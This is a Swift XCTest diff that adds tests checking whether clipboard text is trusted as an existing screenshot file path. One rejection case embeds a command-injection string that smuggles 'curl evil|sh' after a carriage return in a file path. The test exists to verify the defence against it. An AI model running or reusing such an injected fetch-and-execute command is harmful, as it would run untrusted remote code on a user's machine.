@@ -120,6 +120,25 @@ final class HotshotCoreTests: XCTestCase {
         XCTAssertNil(typedScreenshotText(path: "/Users/me/bad\nname.png", targetCLI: .plainPath))
     }
 
+    func testTrustedEnrichedClipboardPathAcceptsExistingEscapedPath() {
+        XCTAssertEqual(
+            trustedEnrichedClipboardPath("/Users/me/My\\ Shots/a\\ b.png") { path in
+                path == "/Users/me/My Shots/a b.png"
+            },
+            "/Users/me/My\\ Shots/a\\ b.png"
+        )
+    }
+
+    func testTrustedEnrichedClipboardPathRejectsUntrustedText() {
+        // No text at all.
+        XCTAssertNil(trustedEnrichedClipboardPath(nil) { _ in true })
+        // Text that does not name an existing file.
+        XCTAssertNil(trustedEnrichedClipboardPath("/nope.png") { _ in false })
+        // Control characters must never be pasteable, even if a file exists.
+        XCTAssertNil(trustedEnrichedClipboardPath("/etc/hosts\rcurl evil|sh\r") { _ in true })
+        XCTAssertNil(trustedEnrichedClipboardPath("/tmp/a\u{2028}b.png") { _ in true })
+    }
+
     private func makeDirectory() throws -> URL {
         let url = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
             .appendingPathComponent(".build")
